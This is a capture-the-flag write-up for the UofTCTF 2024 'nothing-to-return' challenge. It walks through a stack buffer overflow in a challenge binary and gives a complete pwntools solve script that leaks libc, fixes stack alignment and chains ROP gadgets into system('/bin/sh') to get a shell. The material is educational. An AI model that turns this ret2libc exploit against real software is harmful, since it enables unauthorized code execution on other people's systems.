---
title: ntr
date: 2024-02-21
tags: 
- pwn
- rop
- ret2libc
- author-hartmannsyg
categories: UofTCTF 2024
---

## nothing-to-return

written by {% person hartmannsyg %}

We are given a binary and a libc.

{% ccb html:true terminal:true %}
<SPAN STYLE="color:#98C379;">┌──(</SPAN><SPAN STYLE="color:#61AFEF;">rwandi㉿ryan</SPAN><SPAN STYLE="color:#98C379;">)-[</SPAN><SPAN STYLE="color:#DCDFE4;">~/ctf/uoft</SPAN><SPAN STYLE="color:#98C379;">]
└─</SPAN><SPAN STYLE="color:#61AFEF;">$</SPAN><SPAN STYLE="color:#DCDFE4;"> checksec ntr
[</SPAN><SPAN STYLE="color:#61AFEF;">*</SPAN><SPAN STYLE="color:#DCDFE4;">] '/home/rwandi/ctf/uoft/ntr'
    Arch:     amd64-64-little
    RELRO:    </SPAN><SPAN STYLE="color:#E5C07B;">Partial RELRO
</SPAN><SPAN STYLE="color:#DCDFE4;">    Stack:    </SPAN><SPAN STYLE="color:#E06C75;">No canary found
</SPAN><SPAN STYLE="color:#DCDFE4;">    NX:       </SPAN><SPAN STYLE="color:#98C379;">NX enabled
</SPAN><SPAN STYLE="color:#DCDFE4;">    PIE:      </SPAN><SPAN STYLE="color:#E06C75;">No PIE (0x3fe000)
</SPAN><SPAN STYLE="color:#DCDFE4;">    RUNPATH:  </SPAN><SPAN STYLE="color:#E06C75;">b'.'</SPAN>
{% endccb %}

<details>
<summary>my strange method to get libc working</summary>

Install the latest pre-release version of pwntools:
{% ccb terminal:true lang:shell %}
python3 -m pip install --upgrade --pre pwntools
{% endccb %}
then in the solve script:
```py
version = 'libc.so.6'
library_path = libcdb.download_libraries(version)
if library_path:
    elf = context.binary = ELF.patch_custom_libraries(elf.path, library_path)
    libc = elf.libc
else:
    libc = ELF(version)
```
</details>

{% ccb html:true terminal:true %}
<SPAN STYLE="color:#98C379;">┌──(</SPAN><SPAN STYLE="color:#61AFEF;">rwandi㉿ryan</SPAN><SPAN STYLE="color:#98C379;">)-[</SPAN><SPAN STYLE="color:#DCDFE4;">~/ctf/uoft</SPAN><SPAN STYLE="color:#98C379;">]
└─</SPAN><SPAN STYLE="color:#61AFEF;">$</SPAN><SPAN STYLE="color:#DCDFE4;"> ./ntr_remotelibc
printf is at 0x7f318b125250
Hello give me an input
Input size:
16
Enter your input:
aaaaaaaaaaaaaaaa
I'm returning the input:
aaaaaaaaaaaaaaa</SPAN>
{% endccb %}

If we open this up in ghidra:
```c
undefined8 main(EVP_PKEY_CTX *param_1)

{
  char buffer [64];
  
  init(param_1);
  printf("printf is at %p\n",printf);
  puts("Hello give me an input");
  get_input(buffer);
  puts("I\'m returning the input:");
  puts(buffer);
  return 0;
}
```
```c
void get_input(void *end_location)

{
  size_t size;
  char *ptr;
  
  puts("Input size:");
  __isoc99_scanf("%lu[^\n]",&size);
  ptr = (char *)calloc(1,size);
  fgets(ptr,(int)size,stdin);
  puts("Enter your input:");
  fgets(ptr,(int)size,stdin);
  memcpy(end_location,ptr,size);
  free(ptr);
  return;
}
```

What this program does is:
- leak printf location (this is our libc leak)
- ask for input size
- read specified number of bytes into `buffer` (in main())

We essentially have a **buffer overflow** as we can input more than the buffer can store.
- No canary found so we don't need a canary leak
- NX enabled so we have to ROP our way using gadgets to shell
- The binary is too small so we need to use gadgets within the libc provided

{% ccb terminal:true html:true %}
<SPAN STYLE="color:#98C379;">┌──(</SPAN><SPAN STYLE="color:#61AFEF;">rwandi㉿ryan</SPAN><SPAN STYLE="color:#98C379;">)-[</SPAN><SPAN STYLE="color:#DCDFE4;">~/ctf/uoft</SPAN><SPAN STYLE="color:#98C379;">]
└─</SPAN><SPAN STYLE="color:#61AFEF;">$</SPAN><SPAN STYLE="color:#DCDFE4;"> ROPgadget --binary ./libc.so.6 | grep 'pop rdi ; ret'
0x00000000000a1457 : inc dword ptr [rbp + 0x158d48c0] ; </SPAN><SPAN STYLE="color:#E06C75;">pop rdi ; ret</SPAN><SPAN STYLE="color:#DCDFE4;">f 0xc
0x0000000000028265 : </SPAN><SPAN STYLE="color:#E06C75;">pop rdi ; ret
</SPAN><SPAN STYLE="color:#DCDFE4;">0x000000000003df6d : </SPAN><SPAN STYLE="color:#E06C75;">pop rdi ; ret</SPAN><SPAN STYLE="color:#DCDFE4;"> 0x16
0x000000000005a47d : </SPAN><SPAN STYLE="color:#E06C75;">pop rdi ; ret</SPAN><SPAN STYLE="color:#DCDFE4;"> 0xffff
0x00000000000a145d : </SPAN><SPAN STYLE="color:#E06C75;">pop rdi ; ret</SPAN><SPAN STYLE="color:#DCDFE4;">f 0xc
0x00000000000a1459 : ror byte ptr [rax - 0x73], 0x15 ; </SPAN><SPAN STYLE="color:#E06C75;">pop rdi ; ret</SPAN><SPAN STYLE="color:#DCDFE4;">f 0xc</SPAN>
{% endccb %}

To run system("/bin/sh"), we need:

1. system

We need to know if system() is in the libc:

{% ccb terminal:true html:true %}
<span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *
<span class="meta">&gt;&gt;&gt; </span>libc = ELF(<span class="string">'./libc.so.6'</span>)
[</SPAN><SPAN STYLE="color:#61AFEF;">*</SPAN><SPAN STYLE="color:#DCDFE4;">] '/home/rwandi/ctf/uoft/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    </SPAN><SPAN STYLE="color:#98C379;">Full RELRO
</SPAN><SPAN STYLE="color:#DCDFE4;">    Stack:    </SPAN><SPAN STYLE="color:#98C379;">Canary found
</SPAN><SPAN STYLE="color:#DCDFE4;">    NX:       </SPAN><SPAN STYLE="color:#98C379;">NX enabled
</SPAN><SPAN STYLE="color:#DCDFE4;">    PIE:      </SPAN><SPAN STYLE="color:#98C379;">PIE enabled
</SPAN><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(libc.sym[<span class="string">'system'</span>])
<span class="string">'0x4f760'</span>
{% endccb %}


2. "/bin/sh" string in the libc

{% ccb terminal:true lang:py %}
>>> hex(next(libc.search(b'/bin/sh')))
'0x19fe34'
{% endccb %}

Yep, there is a "/bin/sh" in the libc

3. "pop rdi; ret" gadget so that we can input that string into

{% ccb terminal:true html:true highlight:4 %}
<SPAN STYLE="color:#98C379;">┌──(</SPAN><SPAN STYLE="color:#61AFEF;">rwandi㉿ryan</SPAN><SPAN STYLE="color:#98C379;">)-[</SPAN><SPAN STYLE="color:#DCDFE4;">~/ctf/uoft</SPAN><SPAN STYLE="color:#98C379;">]
└─</SPAN><SPAN STYLE="color:#61AFEF;">$</SPAN><SPAN STYLE="color:#DCDFE4;"> ROPgadget --binary ./libc.so.6 | grep 'pop rdi ; ret'
0x00000000000a1457 : inc dword ptr [rbp + 0x158d48c0] ; </SPAN><SPAN STYLE="color:#E06C75;">pop rdi ; ret</SPAN><SPAN STYLE="color:#DCDFE4;">f 0xc
0x0000000000028265 : </SPAN><SPAN STYLE="color:#E06C75;">pop rdi ; ret
</SPAN><SPAN STYLE="color:#DCDFE4;">0x000000000003df6d : </SPAN><SPAN STYLE="color:#E06C75;">pop rdi ; ret</SPAN><SPAN STYLE="color:#DCDFE4;"> 0x16
0x000000000005a47d : </SPAN><SPAN STYLE="color:#E06C75;">pop rdi ; ret</SPAN><SPAN STYLE="color:#DCDFE4;"> 0xffff
0x00000000000a145d : </SPAN><SPAN STYLE="color:#E06C75;">pop rdi ; ret</SPAN><SPAN STYLE="color:#DCDFE4;">f 0xc
0x00000000000a1459 : ror byte ptr [rax - 0x73], 0x15 ; </SPAN><SPAN STYLE="color:#E06C75;">pop rdi ; ret</SPAN><SPAN STYLE="color:#DCDFE4;">f 0xc</SPAN>
{% endccb %}

So let's create our script:
{% ccb lang:py gutter1:1-4,S,13-32 caption:solve.py %}
from pwn import *

context.binary = elf = ELF('./ntr')
context.log_level = 'debug'
//SKIP_LINE(5-12 #Code for loading the libc)
# p = process([elf.path])
p = gdb.debug([elf.path])

p.recvuntil(b"printf is at ")
printf_leak = p.recvline()
printf_leak = int(printf_leak, 16)

libc_base = printf_leak - libc.sym['printf']
log.info('libc_base ' + hex(libc_base))

pop_rdi = libc_base + 0x0000000000028265
binsh = libc_base + next(libc.search("/bin/sh"))
system = libc_base + libc.sym['system']

payload = b'a'*72 + p64(pop_rdi) + p64(binsh) + p64(system)

p.sendline(str(len(payload)).encode())
p.sendline(payload)

p.interactive()
{% endccb %}

{% ccb terminal:true html:true highlight:9 %}
<SPAN STYLE="color:#DCDFE4;">Program received signal SIGSEGV, Segmentation fault.
</SPAN><SPAN STYLE="color:#61AFEF;">0x00007f1f1063a44b </SPAN><SPAN STYLE="color:#DCDFE4;">in </SPAN><SPAN STYLE="color:#E5C07B;">?? </SPAN><SPAN STYLE="color:#DCDFE4;">()
   from </SPAN><SPAN STYLE="color:#98C379;">target:/home/rwandi/.cache/.pwntools-cache-3.11/libcdb_libs/316d0d3666387f0e8f
b98773f51aa1801027c5ab/libc.so.6
</SPAN><SPAN STYLE="color:#DCDFE4;">LEGEND: </SPAN><SPAN STYLE="color:#E5C07B;">STACK </SPAN><SPAN STYLE="color:#DCDFE4;">| </SPAN><SPAN STYLE="color:#61AFEF;">HEAP </SPAN><SPAN STYLE="color:#DCDFE4;">| </SPAN><SPAN STYLE="color:#E06C75;">CODE </SPAN><SPAN STYLE="color:#DCDFE4;">| </SPAN><SPAN STYLE="color:#C678DD;">DATA </SPAN><SPAN STYLE="color:#DCDFE4;">| RWX | RODATA
</SPAN><SPAN STYLE="color:#61AFEF;">────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────
</SPAN>...
<SPAN STYLE="color:#61AFEF;">─────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────
</SPAN><SPAN STYLE="color:#98C379;"> ►</SPAN><SPAN STYLE="color:#DCDFE4;"> </SPAN><SPAN STYLE="color:#98C379;">0x7f1f1063a44b</SPAN><SPAN STYLE="color:#DCDFE4;">    </SPAN><SPAN STYLE="color:#AFD700;">movaps </SPAN><SPAN STYLE="color:#5FD7FF;">xmmword ptr </SPAN><SPAN STYLE="color:#DCDFE4;">[</SPAN><SPAN STYLE="color:#5FD7FF;">rsp </SPAN><SPAN STYLE="color:#DCDFE4;">+ </SPAN><SPAN STYLE="color:#AF87FF;">0x50</SPAN><SPAN STYLE="color:#DCDFE4;">], </SPAN><SPAN STYLE="color:#5FD7FF;">xmm0
</SPAN><SPAN STYLE="color:#DCDFE4;">   0x7f1f1063a450    </SPAN><SPAN STYLE="color:#AFD700;">call</SPAN><SPAN STYLE="color:#DCDFE4;">   </SPAN><SPAN STYLE="color:#AF87FF;">posix_spawn                </SPAN><SPAN STYLE="color:#DCDFE4;">&lt;</SPAN><SPAN STYLE="color:#E06C75;">posix_spawn</SPAN><SPAN STYLE="color:#DCDFE4;">&gt;

   0x7f1f1063a455    </SPAN><SPAN STYLE="color:#AFD700;">mov    </SPAN><SPAN STYLE="color:#5FD7FF;">rdi</SPAN><SPAN STYLE="color:#DCDFE4;">, </SPAN><SPAN STYLE="color:#5FD7FF;">rbx
</SPAN><SPAN STYLE="color:#DCDFE4;">   0x7f1f1063a458    </SPAN><SPAN STYLE="color:#AFD700;">mov    </SPAN><SPAN STYLE="color:#5FD7FF;">r12d</SPAN><SPAN STYLE="color:#DCDFE4;">, </SPAN><SPAN STYLE="color:#5FD7FF;">eax
</SPAN><SPAN STYLE="color:#DCDFE4;">   0x7f1f1063a45b    </SPAN><SPAN STYLE="color:#AFD700;">call</SPAN><SPAN STYLE="color:#DCDFE4;">   </SPAN><SPAN STYLE="color:#AF87FF;">posix_spawnattr_destroy                </SPAN><SPAN STYLE="color:#DCDFE4;">&lt;</SPAN><SPAN STYLE="color:#E06C75;">posix_spawnattr_des
troy</SPAN><SPAN STYLE="color:#DCDFE4;">&gt;

   0x7f1f1063a460    </SPAN><SPAN STYLE="color:#AFD700;">test   </SPAN><SPAN STYLE="color:#5FD7FF;">r12d</SPAN><SPAN STYLE="color:#DCDFE4;">, </SPAN><SPAN STYLE="color:#5FD7FF;">r12d
</SPAN><SPAN STYLE="color:#DCDFE4;">   0x7f1f1063a463    </SPAN><SPAN STYLE="color:#AFD700;">je</SPAN><SPAN STYLE="color:#DCDFE4;">     </SPAN><SPAN STYLE="color:#E06C75;">0x7f1f1063a558                </SPAN><SPAN STYLE="color:#DCDFE4;">&lt;</SPAN><SPAN STYLE="color:#E06C75;">0x7f1f1063a558</SPAN><SPAN STYLE="color:#DCDFE4;">&gt;

   0x7f1f1063a469    </SPAN><SPAN STYLE="color:#AFD700;">mov    </SPAN><SPAN STYLE="color:#5FD7FF;">dword ptr </SPAN><SPAN STYLE="color:#DCDFE4;">[</SPAN><SPAN STYLE="color:#5FD7FF;">rsp </SPAN><SPAN STYLE="color:#DCDFE4;">+ </SPAN><SPAN STYLE="color:#AF87FF;">8</SPAN><SPAN STYLE="color:#DCDFE4;">], </SPAN><SPAN STYLE="color:#AF87FF;">0x7f00
</SPAN><SPAN STYLE="color:#DCDFE4;">   0x7f1f1063a471    </SPAN><SPAN STYLE="color:#AFD700;">xor    </SPAN><SPAN STYLE="color:#5FD7FF;">eax</SPAN><SPAN STYLE="color:#DCDFE4;">, </SPAN><SPAN STYLE="color:#5FD7FF;">eax
</SPAN><SPAN STYLE="color:#DCDFE4;">   0x7f1f1063a473    </SPAN><SPAN STYLE="color:#AFD700;">mov    </SPAN><SPAN STYLE="color:#5FD7FF;">edx</SPAN><SPAN STYLE="color:#DCDFE4;">, </SPAN><SPAN STYLE="color:#AF87FF;">1
</SPAN><SPAN STYLE="color:#DCDFE4;">   0x7f1f1063a478    </SPAN><SPAN STYLE="color:#AFD700;">lock cmpxchg </SPAN><SPAN STYLE="color:#5FD7FF;">dword ptr </SPAN><SPAN STYLE="color:#DCDFE4;">[</SPAN><SPAN STYLE="color:#5FD7FF;">rip </SPAN><SPAN STYLE="color:#DCDFE4;">+ </SPAN><SPAN STYLE="color:#AF87FF;">0x1f1060</SPAN><SPAN STYLE="color:#DCDFE4;">], </SPAN><SPAN STYLE="color:#5FD7FF;">edx
</SPAN><SPAN STYLE="color:#61AFEF;">───────────────────────────────────────[ STACK ]───────────────────────────────────────
</SPAN>...
<SPAN STYLE="color:#61AFEF;">─────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
</SPAN>...
<SPAN STYLE="color:#61AFEF;">───────────────────────────────────────────────────────────────────────────────────────</SPAN>
{% endccb %}

We have a movaps stack alignment issue. To fix this, we have to find a ret gadget:

{% ccb terminal:true html:true %}
<SPAN STYLE="color:#98C379;">┌──(</SPAN><SPAN STYLE="color:#61AFEF;">rwandi㉿ryan</SPAN><SPAN STYLE="color:#98C379;">)-[</SPAN><SPAN STYLE="color:#DCDFE4;">~/ctf/uoft</SPAN><SPAN STYLE="color:#98C379;">]
└─</SPAN><SPAN STYLE="color:#61AFEF;">$</SPAN><SPAN STYLE="color:#DCDFE4;"> ROPgadget --binary ./libc.so.6 | grep ": ret$"
0x000000000002648d </SPAN><SPAN STYLE="color:#E06C75;">: ret</SPAN>
{% endccb %}

{% ccb lang:py gutter1:1-4,S,13-33 caption:solve.py diff_add:16,21 %}
from pwn import *

context.binary = elf = ELF('./ntr')
# context.log_level = 'debug'
//SKIP_LINE(5-12 #Code for loading the libc)
p = process([elf.path])
# p = gdb.debug([elf.path])

p.recvuntil(b"printf is at ")
printf_leak = p.recvline()
printf_leak = int(printf_leak, 16)

libc_base = printf_leak - libc.sym['printf']
log.info('libc_base ' + hex(libc_base))

ret = libc_base + 0x000000000002648d
pop_rdi = libc_base + 0x0000000000028265
binsh = libc_base + next(libc.search("/bin/sh"))
system = libc_base + libc.sym['system']

payload = b'a'*72 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)

p.sendline(str(len(payload)).encode())
p.sendline(payload)

p.interactive()
{% endccb %}

And we get shell!

We have succesfully ntred